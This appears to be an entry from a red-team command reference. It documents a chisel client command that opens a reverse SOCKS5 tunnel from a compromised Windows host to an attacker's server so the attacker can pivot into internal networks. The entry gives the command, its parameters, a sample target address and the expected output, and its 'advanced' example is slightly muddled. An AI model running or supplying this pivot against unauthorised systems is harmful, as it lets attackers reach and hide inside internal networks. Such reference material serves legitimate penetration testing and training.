---
type: command
executor: cmd
data: '.\chisel.exe client $_SERVER_IP:8008 R:socks'
tags:
  - client
  - socks-proxy
  - chisel
platforms:
  - Windows
verified: true
validated: true
---

# chisel-client-socks-proxy

## Command

```cmd
.\chisel.exe client $_SERVER_IP:8008 R:socks
```

## Description

Establishes a reverse SOCKS5 proxy tunnel from the client to the server, allowing the attacker to proxy traffic through the compromised host to internal networks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `client` | Mode to run as client | Yes |
| `$_SERVER_IP:8008` | Server address and port | Yes |
| `R:socks` | Enable reverse SOCKS proxy (defaults to port 1080 on server) | Yes |
| `.\chisel.exe` | Path to Windows binary | Yes |

## Examples

### Basic Usage

```cmd
.\chisel.exe client 192.168.1.100:8008 R:socks
```

### Advanced Usage

Specify SOCKS port: `.\chisel.exe client 192.168.1.100:8008 R:socks --socks5` (though R:socks implies SOCKS5).

## Expected Output

"socks: connected" with proxy ready on server at 127.0.0.1:1080.

## Related

- [[procedures/chisel-port-forwarding-and-socks-proxy-network-pivoting]]
- [[tools/Chisel]]
